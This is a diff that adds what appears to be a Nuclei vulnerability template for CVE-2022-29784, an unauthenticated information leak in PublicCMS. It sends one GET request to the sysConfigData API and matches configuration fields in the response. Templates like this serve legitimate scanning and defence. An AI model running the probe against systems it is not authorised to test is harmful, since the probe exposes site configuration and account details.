@@ -1,0 +1,37 @@
+id: cve-2022-29784
+info:
+  name: PublicCMS SysConfigDataDirective Information Disclosure
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    PublicCMS V4.0.202204.a and below contains an information leak via the component `/views/directive/sys/SysConfigDataDirective.java`. An attacker can obtain background configuration information through this unauthorized API.
+  reference:
+    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-29784
+    - https://github.com/JinYiTong/CVE-Req/blob/main/publiccms/publiccms.md
+    - https://github.com/sanluan/PublicCMS/commit/d8d7626cf51e4968fb384e1637a3c0c9921f33e9
+  classification:
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cve-id: CVE-2022-29784
+  tags: information-disclosure
+
+http:
+  - raw:
+      - |
+        GET /api/directive/sysConfigData HTTP/1.1
+        Host: {{Hostname}}
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "site"
+          - "cors"
+      - type: regex
+        part: body
+        regex:
+          - "(?i)(siteAttribute|email|wechat|alipay)"
